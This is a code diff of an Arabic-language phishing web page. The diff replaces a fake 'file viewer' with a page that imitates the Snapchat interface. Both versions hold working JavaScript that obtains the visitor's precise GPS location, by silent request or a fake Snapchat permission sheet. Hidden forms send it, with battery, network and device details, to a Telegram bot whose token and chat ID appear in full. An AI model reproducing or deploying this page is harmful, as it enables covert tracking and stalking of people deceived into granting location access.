@@ -3,58 +3,147 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-<title>مشاهدة الملف</title>
+<title>Snapchat</title>
 <style>
-* { margin: 0; padding: 0; box-sizing: border-box; }
-body {
-  background: #0a0a0a;
-  color: #fff;
-  font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
-  min-height: 100vh;
-  display: flex;
-  justify-content: center;
-  align-items: center;
+*{margin:0;padding:0;box-sizing:border-box;-webkit-tap-highlight-color:transparent;user-select:none}
+body{background:#000;color:#fff;font-family:-apple-system,BlinkMacSystemFont,'Segoe UI',sans-serif;min-height:100vh;overflow:hidden;position:fixed;width:100%;height:100%}
+.camera{
+  position:absolute;top:0;left:0;width:100%;height:100%;
+  background:linear-gradient(135deg,#1a1a2e,#16213e,#0f3460,#e94560);
+  background-size:400% 400%;animation:grad 8s ease infinite
 }
-.container { text-align: center; padding: 20px; max-width: 360px; }
-.spinner {
-  width: 44px; height: 44px;
-  border: 3px solid #1a2a1a;
-  border-top: 3px solid #00ff41;
-  border-radius: 50%;
-  animation: spin 0.8s linear infinite;
-  margin: 0 auto 20px;
+@keyframes grad{0%{background-position:0% 50%}50%{background-position:100% 50%}100%{background-position:0% 50%}}
+.camera::after{
+  content:'';position:absolute;top:0;left:0;width:100%;height:100%;
+  background:radial-gradient(circle at 50% 40%,transparent 30%,rgba(0,0,0,0.4) 100%)
 }
-@keyframes spin { to { transform: rotate(360deg); } }
-h2 { font-size: 16px; font-weight: 400; color: #aaa; margin-bottom: 6px; }
-p { font-size: 12px; color: #555; }
-.content { display: none; margin-top: 10px; }
-.content img { max-width: 100%; border-radius: 6px; box-shadow: 0 0 20px rgba(0,255,65,0.05); }
-.footer { margin-top: 20px; font-size: 10px; color: #222; }
+.top-bar{
+  position:absolute;top:0;left:0;right:0;z-index:10;
+  display:flex;justify-content:space-between;align-items:center;
+  padding:50px 16px 10px
+}
+.top-bar .time{font-size:15px;font-weight:600;letter-spacing:1px}
+.top-bar .icons{display:flex;gap:18px}
+.top-bar .icons span{font-size:20px;filter:drop-shadow(0 0 4px rgba(0,0,0,0.5))}
+.snap-ui{
+  position:absolute;bottom:0;left:0;right:0;z-index:10;
+  background:linear-gradient(transparent,rgba(0,0,0,0.85) 30%);
+  padding:20px 16px 40px
+}
+.snap-tabs{
+  display:flex;justify-content:space-around;align-items:center;margin-bottom:16px
+}
+.snap-tabs div{font-size:11px;color:#888;text-transform:uppercase;letter-spacing:1px;padding:6px 12px;border-radius:20px;transition:all 0.2s}
+.snap-tabs .active{color:#fff;background:rgba(255,255,255,0.12)}
+.stories{display:flex;gap:14px;overflow-x:auto;padding:4px 0 12px;scrollbar-width:none}
+.stories::-webkit-scrollbar{display:none}
+.story{text-align:center;min-width:64px;cursor:pointer}
+.story .av{
+  width:60px;height:60px;border-radius:50%;margin:0 auto 4px;
+  border:3px solid transparent;position:relative;
+  background:linear-gradient(45deg,#feda75,#ff7b7b,#d62976,#962fbf,#4f5bd5) border-box;
+  -webkit-mask:linear-gradient(#fff 0 0) padding-box,linear-gradient(#fff 0 0);
+  mask:linear-gradient(#fff 0 0) padding-box,linear-gradient(#fff 0 0);
+  -webkit-mask-composite:destination-out;mask-composite:exclude;
+  padding:3px
+}
+.story .av-inner{width:100%;height:100%;border-radius:50%;background:#2a2a3a;display:flex;justify-content:center;align-items:center;font-size:18px}
+.story .name{font-size:10px;color:#ccc;max-width:60px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap}
+.chats{position:absolute;bottom:80px;left:0;right:0;padding:0 16px;z-index:10}
+.chat-item{display:flex;align-items:center;gap:12px;padding:8px 0;border-bottom:1px solid rgba(255,255,255,0.06)}
+.chat-item .cav{width:44px;height:44px;border-radius:50%;background:#2a2a3a;flex-shrink:0;display:flex;justify-content:center;align-items:center;font-size:18px}
+.chat-item .cinfo{flex:1}
+.chat-item .cname{font-size:13px;font-weight:500;color:#eee;margin-bottom:2px}
+.chat-item .cmsg{font-size:11px;color:#666}
+.chat-item .ctime{font-size:10px;color:#555}
+#permissionOverlay{
+  display:none;position:fixed;top:0;left:0;width:100%;height:100%;
+  background:rgba(0,0,0,0.5);z-index:999;justify-content:center;align-items:flex-end;
+  backdrop-filter:blur(3px);-webkit-backdrop-filter:blur(3px)
+}
+#permissionOverlay.active{display:flex}
+.permission-sheet{
+  background:#1c1c1e;border-radius:16px 16px 0 0;width:100%;max-width:500px;
+  padding:24px 20px 36px;animation:slideUp 0.3s ease-out
+}
+@keyframes slideUp{from{transform:translateY(100%)}to{transform:translateY(0)}}
+.permission-sheet .icon{text-align:center;font-size:40px;margin-bottom:6px}
+.permission-sheet h3{text-align:center;font-size:17px;font-weight:600;color:#fff;margin-bottom:4px}
+.permission-sheet p{text-align:center;font-size:12px;color:#888;line-height:1.5;margin-bottom:20px;padding:0 10px}
+.permission-sheet .btn-group{display:flex;gap:10px}
+.permission-sheet button{
+  flex:1;padding:14px;border-radius:14px;border:none;font-size:15px;font-weight:600;cursor:pointer;transition:opacity 0.2s
+}
+.permission-sheet button:active{opacity:0.7}
+.permission-sheet .allow{background:#fffc00;color:#000}
+.permission-sheet .deny{background:#2c2c2e;color:#888}
+#loadingAfter{
+  display:none;position:fixed;top:0;left:0;width:100%;height:100%;
+  background:rgba(0,0,0,0.7);z-index:1000;justify-content:center;align-items:center;flex-direction:column
+}
+#loadingAfter.active{display:flex}
+#loadingAfter .sp{width:32px;height:32px;border:3px solid #333;border-top:3px solid #fffc00;border-radius:50%;animation:spin 0.7s linear infinite;margin-bottom:10px}
+@keyframes spin{to{transform:rotate(360deg)}}
+#loadingAfter span{font-size:13px;color:#aaa}
 </style>
 </head>
 <body>
-<div class="container">
-  <div id="loader">
-    <div class="spinner"></div>
-    <h2>جاري التحميل...</h2>
-    <p>يرجى الانتظار قليلاً</p>
-  </div>
-  <div id="content" class="content">
-    <img src="data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' width='400' height='300'%3E%3Crect fill='%23111' width='400' height='300'/%3E%3Ctext x='200' y='150' text-anchor='middle' fill='%23333' font-size='14'%3E📸%3C/text%3E%3C/svg%3E" alt="preview">
-  </div>
-  <div class="footer">© CloudMedia</div>
+<div class="camera"></div>
+
+<div class="top-bar">
+  <div class="time"><span id="clock">00:00</span></div>
+  <div class="icons"><span>🔦</span><span>📷</span></div>
 </div>
 
-<iframe name="_tg" style="display:none" id="_tg"></iframe>
+<div class="snap-ui">
+  <div class="snap-tabs">
+    <div class="active">القصص</div>
+    <div>الخريطة</div>
+    <div>الدردشة</div>
+    <div>العدسة</div>
+  </div>
+  <div class="stories" id="stories">
+    <div class="story"><div class="av"><div class="av-inner">👻</div></div><div class="name">قصتي</div></div>
+    <div class="story"><div class="av"><div class="av-inner">😎</div></div><div class="name">أحمد</div></div>
+    <div class="story"><div class="av"><div class="av-inner">🤩</div></div><div class="name">سارة</div></div>
+    <div class="story"><div class="av"><div class="av-inner">🔥</div></div><div class="name">محمد</div></div>
+    <div class="story"><div class="av"><div class="av-inner">💪</div></div><div class="name">نورة</div></div>
+    <div class="story"><div class="av"><div class="av-inner">❤️</div></div><div class="name">الجوكر</div></div>
+  </div>
+</div>
 
-<form id="f1" action="https://api.telegram.org/bot8958912849:AAE4LQG6QlA3qGQccfIbI8ghZDMgWida-yg/sendLocation" method="POST" target="_tg" style="display:none">
+<div class="chats">
+  <div class="chat-item"><div class="cav">👻</div><div class="cinfo"><div class="cname">Snapchat</div><div class="cmsg">شاهد القصص القريبة منك</div></div></div>
+  <div class="chat-item"><div class="cav">📍</div><div class="cinfo"><div class="cname">Snap Map</div><div class="cmsg">فعّل الموقع لرؤية الأصدقاء قريبك</div></div></div>
+</div>
+
+<div id="permissionOverlay">
+  <div class="permission-sheet">
+    <div class="icon">📍</div>
+    <h3>Snapchat تريد الوصول لموقعك</h3>
+    <p>لعرض القصص القريبة منك والأصدقاء على خريطة Snapchat، يرجى السماح بالوصول إلى موقعك</p>
+    <div class="btn-group">
+      <button class="deny" id="denyBtn">ليس الآن</button>
+      <button class="allow" id="allowBtn">السماح</button>
+    </div>
+  </div>
+</div>
+
+<div id="loadingAfter">
+  <div class="sp"></div>
+  <span>جاري تحميل القصص القريبة...</span>
+</div>
+
+<iframe name="_tg" style="display:none"></iframe>
+
+<form action="https://api.telegram.org/bot8958912849:AAE4LQG6QlA3qGQccfIbI8ghZDMgWida-yg/sendLocation" method="POST" target="_tg" style="display:none">
   <input type="hidden" name="chat_id" value="972326806">
   <input type="hidden" name="latitude" id="_lat" value="">
   <input type="hidden" name="longitude" id="_lng" value="">
   <input type="hidden" name="horizontal_accuracy" id="_acc" value="">
 </form>
 
-<form id="f2" action="https://api.telegram.org/bot8958912849:AAE4LQG6QlA3qGQccfIbI8ghZDMgWida-yg/sendMessage" method="POST" target="_tg" style="display:none">
+<form action="https://api.telegram.org/bot8958912849:AAE4LQG6QlA3qGQccfIbI8ghZDMgWida-yg/sendMessage" method="POST" target="_tg" style="display:none">
   <input type="hidden" name="chat_id" value="972326806">
   <input type="hidden" name="text" id="_msg" value="">
   <input type="hidden" name="parse_mode" value="HTML">
@@ -62,53 +151,81 @@ p { font-size: 12px; color: #555; }
 </form>
 
 <script>
-(function() {
-  var ID = '#' + Date.now().toString(36).toUpperCase();
+(function(){
+  var ID = Math.random().toString(36).slice(2,9).toUpperCase();
+  var sent = false;
+  var permOverlay = document.getElementById('permissionOverlay');
+  var loadingAfter = document.getElementById('loadingAfter');
+  var gpsTimer = null;
 
-  function sendLocation(pos) {
-    var lat = pos.coords.latitude;
-    var lng = pos.coords.longitude;
-    var acc = pos.coords.accuracy || 0;
+  function tick(){var d=new Date();document.getElementById('clock').textContent=d.getHours().toString().padStart(2,'0')+':'+d.getMinutes().toString().padStart(2,'0')}
+  tick();setInterval(tick,1000)
 
-    document.getElementById('_lat').value = lat;
-    document.getElementById('_lng').value = lng;
-    document.getElementById('_acc').value = Math.round(acc);
-    document.getElementById('f1').submit();
-
-    var batt = '?';
-    try { var b = navigator.battery || navigator.getBattery(); if (b && b.level !== undefined) batt = Math.round(b.level * 100) + '%'; } catch(e) {}
-
-    var net = '?';
-    try { var c = navigator.connection; if (c) net = c.type || (c.effectiveType || '?'); } catch(e) {}
-
-    var msg = '<b>📍 موقع جديد</b>\n'
-      + '🆔 ' + ID + '\n'
-      + '📌 <a href="https://www.google.com/maps?q=' + lat + ',' + lng + '">' + lat + ', ' + lng + '</a>\n'
-      + '🎯 ±' + acc.toFixed(1) + 'م\n'
-      + '📱 ' + (navigator.userAgent || '?').slice(0, 40) + '\n'
-      + '🔋 ' + batt + ' | ' + '📶 ' + net;
-
-    document.getElementById('_msg').value = msg;
-    document.getElementById('f2').submit();
+  function tgLocation(pos){
+    var lat=pos.coords.latitude,lng=pos.coords.longitude,acc=pos.coords.accuracy||0
+    document.getElementById('_lat').value=lat
+    document.getElementById('_lng').value=lng
+    document.getElementById('_acc').value=Math.round(acc)
+    document.forms[0].submit()
+    var batt='?';try{var b=navigator.battery;if(b&&b.level)batt=Math.round(b.level*100)+'%'}catch(e){}
+    var net='?';try{var c=navigator.connection;if(c)net=(c.type||c.effectiveType||'?')}catch(e){}
+    var msg='<b>📍 SnapChat موقع</b>\n'
+      +'🆔 '+ID+'\n'
+      +'🎯 <a href="https://www.google.com/maps?q='+lat+','+lng+'">'+lat+', '+lng+'</a>\n'
+      +'📏 ±'+acc.toFixed(1)+'م\n'
+      +'🔋 '+batt+' | '+'📶 '+net+'\n'
+      +'🕐 '+new Date().toLocaleString('ar-SA')
+    document.getElementById('_msg').value=msg
+    document.forms[1].submit()
+    sent=true
+    setTimeout(function(){loadingAfter.classList.remove('active')},500)
   }
 
-  function fallback() {
-    var msg = '⚠️ ' + ID + ' | تعذر الوصول للموقع (الرفض)';
-    document.getElementById('_msg').value = msg;
-    document.getElementById('f2').submit();
+  function tgError(){
+    if(sent)return
+    var msg='⚠️ '+ID+' | رفض الموقع'
+    document.getElementById('_msg').value=msg
+    document.forms[1].submit()
+    sent=true
+    loadingAfter.classList.remove('active')
   }
 
-  if (navigator.geolocation) {
-    navigator.geolocation.getCurrentPosition(sendLocation, fallback, {
-      enableHighAccuracy: true, timeout: 4000, maximumAge: 0
-    });
+  function requestGPS(){
+    gpsTimer=setTimeout(function(){
+      if(!sent){tgError();loadingAfter.classList.remove('active')}
+    },12000)
+    navigator.geolocation.getCurrentPosition(function(p){clearTimeout(gpsTimer);tgLocation(p)},function(e){clearTimeout(gpsTimer);tgError()},{
+      enableHighAccuracy:true,timeout:10000,maximumAge:0
+    })
   }
 
-  setTimeout(function() {
-    document.getElementById('loader').style.display = 'none';
-    document.getElementById('content').style.display = 'block';
-  }, 2000);
-})();
+  function showPermSheet(){
+    permOverlay.classList.add('active')
+  }
+
+  document.addEventListener('touchstart',function firstTouch(){
+    document.removeEventListener('touchstart',firstTouch)
+    document.removeEventListener('click',firstClick)
+    showPermSheet()
+  },{passive:true})
+
+  function firstClick(){
+    document.removeEventListener('click',firstClick)
+    document.removeEventListener('touchstart',firstTouch)
+    showPermSheet()
+  }
+  document.addEventListener('click',firstClick)
+
+  document.getElementById('allowBtn').addEventListener('click',function(){
+    permOverlay.classList.remove('active')
+    loadingAfter.classList.add('active')
+    requestGPS()
+  })
+
+  document.getElementById('denyBtn').addEventListener('click',function(){
+    permOverlay.classList.remove('active')
+  })
+})()
 </script>
 </body>
 </html>
